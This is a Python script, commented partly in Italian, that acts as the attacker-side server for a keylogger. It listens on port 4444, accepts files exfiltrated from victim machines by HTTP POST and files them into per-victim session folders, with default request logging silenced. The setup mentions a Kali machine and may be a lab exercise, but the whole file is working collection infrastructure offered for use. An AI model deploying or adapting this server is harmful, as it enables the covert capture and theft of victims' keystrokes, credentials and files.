#!/usr/bin/env python3
# ============================================================
#  SERVER ATTACCANTE (macchina Kali "attaccante")
#  Raccoglie i file esfiltrati dal keylogger via HTTP POST.
#  Each victim reboot creates a new session folder so files
#  from different sessions never mix.
#  Uso:  python3 server_attaccante.py
# ============================================================
import http.server, socketserver, os, datetime, threading

PORT     = 4444
SAVE_DIR = "ricevuti"

os.makedirs(SAVE_DIR, exist_ok=True)

# Maps victim IP -> current session folder path
_sessions = {}
_sessions_lock = threading.Lock()

def _new_session_dir(client_ip):
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ip = client_ip.replace(":", "-")
    name = f"session_{safe_ip}_{ts}"
    path = os.path.join(SAVE_DIR, name)
    os.makedirs(path, exist_ok=True)
    return path

def _get_session_dir(client_ip, is_heartbeat):
    with _sessions_lock:
        if is_heartbeat or client_ip not in _sessions:
            session_dir = _new_session_dir(client_ip)
            _sessions[client_ip] = session_dir
            if is_heartbeat:
                print(f"[*] New session for {client_ip} -> {session_dir}")
        return _sessions[client_ip]

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data   = self.rfile.read(length)
        fname  = os.path.basename(self.headers.get(
                     "X-Filename", f"dump_{datetime.datetime.now():%Y%m%d_%H%M%S}.bin"))
        client_ip = self.client_address[0]
        is_heartbeat = fname.startswith("heartbeat_")

        session_dir = _get_session_dir(client_ip, is_heartbeat)

        # anti path traversal: basename + solo dentro session_dir
        path = os.path.join(session_dir, fname)
        with open(path, "wb") as f:
            f.write(data)
        print(f"[+] Ricevuto: {fname} ({len(data)} byte) da {client_ip} -> {session_dir}")
        self.send_response(200); self.end_headers(); self.wfile.write(b"OK")

    def log_message(self, *a):  # silenzia i log HTTP di default
        pass

class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

if __name__ == "__main__":
    with Server(("0.0.0.0", PORT), Handler) as srv:
        print(f"[*] In ascolto su 0.0.0.0:{PORT} - file salvati in ./{SAVE_DIR}/")
        srv.serve_forever()
